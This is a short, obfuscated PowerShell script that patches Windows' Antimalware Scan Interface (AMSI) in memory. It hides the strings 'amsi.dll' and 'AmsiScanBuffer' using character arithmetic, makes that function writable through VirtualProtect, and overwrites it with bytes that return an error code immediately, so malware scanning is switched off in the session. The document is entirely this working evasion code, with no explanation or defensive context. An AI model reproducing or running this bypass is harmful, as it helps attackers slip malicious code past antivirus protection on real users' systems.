$QWpRXAvI7Pw = @"
using System;
using System.Runtime.InteropServices;
public class QWpRXAvI7Pw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr YPPg613_y, string Jb77bGKKTfcW2);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr uQS0, UIntPtr HXojJqLngdDW1wWcwVc, uint H_1Kr6, out uint wS18V7UEa_y);
}
"@

Add-Type $QWpRXAvI7Pw

$QNV = [QWpRXAvI7Pw]::LoadLibrary("$([CHAR](41+56)+[cHAR]([ByTe]0x6d)+[chAr]([byTe]0x73)+[ChAr]([byte]0x69)+[ChAr]([BYTe]0x2e)+[chAr](15+85)+[chaR]([BytE]0x6c)+[chAR]([BYte]0x6c))")
$vxdN8bYFuEe9fiwqkMu = [QWpRXAvI7Pw]::GetProcAddress($QNV, "$([chAR]([BYtE]0x41)+[Char]([ByTe]0x6d)+[char]([BYtE]0x73)+[chAR]([Byte]0x69)+[chAr]([BYTE]0x53)+[cHAR](99*76/76)+[ChaR]([ByTe]0x61)+[chAr]([bYTe]0x6e)+[Char](66)+[ChAr]([bYtE]0x75)+[Char](57+45)+[cHar]([Byte]0x66)+[cHar]([BYtE]0x65)+[chaR](114))")
$p = 0
[QWpRXAvI7Pw]::VirtualProtect($vxdN8bYFuEe9fiwqkMu, [uint32]5, 0x40, [ref]$p)
$i5zsvfL = "0xB8"
$GLE0LkXaOARby = "0x57"
$K2l9b6UejrM = "0x00"
$CvbCajoPmDcsIRR = "0x07"
$gvwf74 = "0x80"
$FUdE5H = "0xC3"
$VGE2TQZXelj93jQ = [Byte[]] ($i5zsvfL,$GLE0LkXaOARby,$K2l9b6UejrM,$CvbCajoPmDcsIRR,+$gvwf74,+$FUdE5H)
[System.Runtime.InteropServices.Marshal]::Copy($VGE2TQZXelj93jQ, 0, $vxdN8bYFuEe9fiwqkMu, 6)